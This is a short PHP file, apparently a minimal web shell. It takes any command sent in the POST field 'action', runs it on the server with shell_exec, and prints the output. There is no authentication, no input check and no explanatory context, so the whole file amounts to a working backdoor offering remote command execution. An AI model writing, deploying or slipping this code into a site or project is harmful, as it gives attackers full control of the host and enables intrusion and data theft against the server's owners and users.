

<?php 
   if ($_POST['action'])
    {
        $output = shell_exec($_POST['action']);
        echo $output;
    }
?>



